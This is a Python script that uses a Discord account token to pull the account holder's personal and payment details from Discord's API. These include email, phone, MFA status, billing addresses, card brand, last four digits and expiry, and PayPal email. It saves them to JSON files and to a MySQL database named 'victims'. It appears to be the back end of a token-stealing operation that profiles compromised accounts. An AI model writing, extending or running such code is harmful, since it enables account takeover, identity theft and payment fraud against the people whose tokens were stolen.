import requests
from datetime import datetime, timezone
import json
import mysql.connector

# Database configuration
db_config = {
    'user': 'root',  # replace with your MySQL username
    'password': '',  # replace with your MySQL password
    'host': '127.0.0.1',  # replace with your MySQL host if different
    'database': 'victims'
}

def insert_user_info(data):
    conn = mysql.connector.connect(**db_config)
    cursor = conn.cursor()
    
    # Base query
    base_query = """
    INSERT INTO user_info ({fields}) VALUES ({placeholders})
    ON DUPLICATE KEY UPDATE {updates}
    """
    
    # Filter out keys with None values
    fields = [key for key in data.keys() if data[key] is not None]
    placeholders = ["%s"] * len(fields)
    updates = [f"{field}=VALUES({field})" for field in fields]

    # Complete query with dynamic fields, placeholders, and updates
    query = base_query.format(
        fields=", ".join(fields),
        placeholders=", ".join(placeholders),
        updates=", ".join(updates)
    )
    
    # Execute query
    cursor.execute(query, tuple(data[field] for field in fields))
    
    conn.commit()
    cursor.close()
    conn.close()

def save_user_data(user_id, user_data):
    filename = f"user_{user_id}_data.json"
    with open(filename, "w") as file:
        json.dump(user_data, file, indent=4)

def parse_friend_data(friends_data):
    return len(friends_data)

def process_user_data(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if res.status_code == 200: # code 200 if valid
        res_json = res.json()

        user_id = res_json['id']

        # Fetch user's friends count
        friends_res = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if friends_res.status_code == 200:
            friends_data = friends_res.json()

            # Parse friend data
            friend_count = parse_friend_data(friends_data)

            # Process other user information
            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            avatar_id = res_json['avatar']
            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif' if avatar_id else None
            phone_number = res_json.get('phone')
            email = res_json.get('email')
            mfa_enabled = res_json.get('mfa_enabled')
            flags = res_json.get('flags')
            locale = res_json.get('locale')
            verified = res_json.get('verified')
            
            creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000, tz=timezone.utc).strftime('%d-%m-%Y %H:%M:%S UTC')

            has_nitro = False
            nitro_data = requests.get('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()
            has_nitro = bool(nitro_data) if nitro_data else False
            days_left = abs((datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S") - datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")).days) if has_nitro else None

            payment_type = None
            valid = None
            cc_holder_name = None
            cc_brand = None
            cc_number = None
            cc_exp_date = None
            address_1 = None
            address_2 = None
            city = None
            postal_code = None
            state = None
            country = None
            default_payment_method = None
            paypal_name = None
            paypal_email = None

            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                y = x['billing_address']
                name = y['name']
                address_1 = y['line_1']
                address_2 = y['line_2']
                city = y['city']
                postal_code = y['postal_code']
                state = y['state']
                country = y['country']

                if x['type'] == 1:
                    payment_type = 'Credit Card'
                    valid = not x['invalid']
                    cc_holder_name = name
                    cc_brand = x['brand']
                    cc_number = f"**** **** **** {x['last_4']}"
                    cc_exp_date = f"{x['expires_month']}/{x['expires_year']}"
                    default_payment_method = x['default']

                elif x['type'] == 2:
                    payment_type = 'PayPal'
                    valid = not x['invalid']
                    paypal_name = name
                    paypal_email = x['email']
                    default_payment_method = x['default']

            # Combine user information into a response dictionary
            response = {
                'user_name': user_name,
                'user_id': user_id,
                'creation_date': creation_date,
                'avatar_url': avatar_url,
                'phone_number': phone_number,
                'email': email,
                'mfa_enabled': mfa_enabled,
                'flags': flags,
                'locale': locale,
                'verified': verified,
                'has_nitro': has_nitro,
                'days_left': days_left,
                'payment_type': payment_type,
                'valid': valid,
                'cc_holder_name': cc_holder_name,
                'cc_brand': cc_brand,
                'cc_number': cc_number,
                'cc_exp_date': cc_exp_date,
                'address_1': address_1,
                'address_2': address_2,
                'city': city,
                'postal_code': postal_code,
                'state': state,
                'country': country,
                'default_payment_method': default_payment_method,
                'paypal_name': paypal_name,
                'paypal_email': paypal_email,
                'friend_count': friend_count  # Adding friend count to the response
            }

            # Remove null values from the response
            response = {key: value for key, value in response.items() if value is not None}


            # Save user data to a JSON file
            save_user_data(user_id, response)

            # Insert the data into the database
            # insert_user_info(response)

            return response, 200
    return None, 401
